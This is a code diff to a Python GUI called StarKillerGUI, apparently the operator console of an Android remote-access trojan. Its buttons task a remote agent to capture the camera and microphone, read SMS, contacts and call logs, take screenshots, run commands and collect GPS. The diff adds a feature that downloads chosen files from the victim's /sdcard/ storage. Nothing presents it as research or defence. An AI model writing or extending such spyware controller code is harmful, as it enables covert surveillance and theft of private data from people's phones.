@@ -544,9 +544,9 @@ class StarKillerGUI:
             ("CAMERA", "camera"), ("MIC", "mic"),
             ("SMS", "sms_read"), ("CONTACTS", "contacts"),
             ("CALLS", "calllog"), ("APPS", "apps"),
-            ("SCREEN", "screenshot"), ("NOTIFS", "notifs"),
-            ("FILES", "ls"), ("EXEC", "exec"),
-            ("KEYLOG", "keylog"), ("PING", "ping"),
+            ("SCREEN", "screenshot"), ("SCR GRANT", "screen_grant"),
+            ("FILES", "ls"), ("DOWNLOAD", "download"),
+            ("EXEC", "exec"), ("PING", "ping"),
         ]
 
         for i, (label, op) in enumerate(ops):
@@ -706,6 +706,12 @@ class StarKillerGUI:
             if not dur:
                 return
             kwargs["duration"] = dur
+        elif op == "download":
+            from tkinter.simpledialog import askstring
+            path = askstring("Download", "File path:", initialvalue="/sdcard/", parent=self.root)
+            if not path:
+                return
+            kwargs["path"] = path
         elif op == "recon":
             for sub_op in ["sysinfo", "gps", "sms_read", "contacts", "calllog", "apps"]:
                 agent.send_task(sub_op)
